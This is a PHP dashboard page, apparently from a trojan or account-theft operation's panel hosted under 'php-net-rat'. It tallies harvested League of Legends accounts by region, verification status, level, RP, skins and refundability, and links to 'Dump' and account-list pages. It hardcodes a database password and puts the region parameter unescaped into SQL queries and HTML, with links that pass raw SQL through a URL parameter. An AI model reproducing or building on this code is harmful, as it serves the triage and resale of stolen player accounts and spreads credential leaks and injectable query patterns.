<!DOCTYPE html>
<html lang="en" class="demo-3">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
		<title>LC Statistics</title>
		<link rel="stylesheet" type="text/css" href="css/style.css" />
		<link href='http://fonts.googleapis.com/css?family=Hammersmith+One|Questrial' rel='stylesheet' type='text/css'>
		<script src="js/modernizr.custom.63321.js"></script>
		<link rel="stylesheet" href="css/style_menu.css">
		<link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
		<link rel="stylesheet" href="css/style_profile.css">
	</head>
	<body>
		<div class="container">
			<header>
				<h1><strong>League</strong> accounts</h1>
				<h2>v 1.0.0.0</h2><br>
				<section class="container">
					<nav>
					  <ul class="nav">
						<li><a href="http://php-net-rat.esy.es/users.php" title="Accounts">Accounts</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/dumplist.php" title="Search">Dump</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/select_region.php" title="Statistics">Statistics</a></li>
					  </ul>
					</nav>	
				</section>
			</header>
			<center>
			
				<div class="profile-box">
					<figure class="profile-header">
					<figcaption class="profile-name">
						<font color="orange"><?php echo $_GET['region']; ?> Statistics</font>
					</figcaption>
					</figure>
					
					<p class="profile-detail">
						<span class="profile-label">Users:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.lc_users;')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Online users:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.lc_users WHERE `online`=\'1\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Accounts:</span><span class="profile-value">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts where `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Unverified Accounts:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `verified`!='Validated' AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `verified`!='Validated' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Verified Accounts:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `verified`='Validated' AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `verified`='Validated' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Under 10:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `level`<'10' AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `level`<'10' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Over 400 RP:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `rp`>='400' AND `level`>='10' AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `rp`>='400' AND `level`>='10' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Over 250 RP:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `rp`>='250' AND `level`>='10' AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `rp`>='250' AND `level`>='10' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Refundable:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `refunds`>='1' AND `can_refund_rp`='Yes' AND `level`>10 AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `refunds`>='1' AND `can_refund_rp`='Yes' AND `level`>=10 and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Unverified with Skins:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `skins`>='1' AND `level`>='10' AND (`verified`='Not validated' OR `verified`='Token Generated') AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `skins`>='1' AND `level`>='10' AND `verified`!='Validated' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Unranked, Unverified Level 30:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `division`='Unranked' AND `level`='30' AND (`verified`='Not validated' OR `verified`='Token Generated') AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `division`='Unranked' AND `level`='30' AND `verified`!='Validated' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">Ranked, Unverified Level 30:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/stat.php?query=SELECT * FROM u474826184_rp.accounts WHERE `division`!='Unranked' AND `level`='30' AND (`verified`='Not validated' OR `verified`='Token Generated') AND `region`='<?php echo $_GET['region']; ?>';">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query("SELECT * FROM u474826184_rp.accounts WHERE `division`!='Unranked' AND `level`='30' AND `verified`!='Validated' and `region`='".$_GET['region']."';")  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					
				</div>
					
				
			
			</center>
		</div>
		></a>
	</body>
</html>